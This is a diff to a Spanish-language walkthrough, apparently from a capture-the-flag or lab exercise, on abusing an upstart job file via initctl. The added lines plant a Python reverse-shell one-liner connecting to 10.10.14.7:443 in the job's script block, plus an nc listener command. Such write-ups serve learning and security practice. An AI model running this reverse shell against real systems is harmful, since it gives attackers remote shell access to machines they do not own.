@@ -159,7 +159,25 @@ Descubrimos como trucar el "inictl" para remplazar el contenido
 start on pwn
 task
 exec
+```
+Si esto funciona simplemente ejecutamos una reverse shell dentro del código "script"
 
+```
+script
+
+    exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    export HOME="/srv"
+    echo $$ > /var/run/nodetest.pid
+    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
+
+end script
+```
+
+```
+nc -lvnp 443
+```
+
+GG
 
 
 
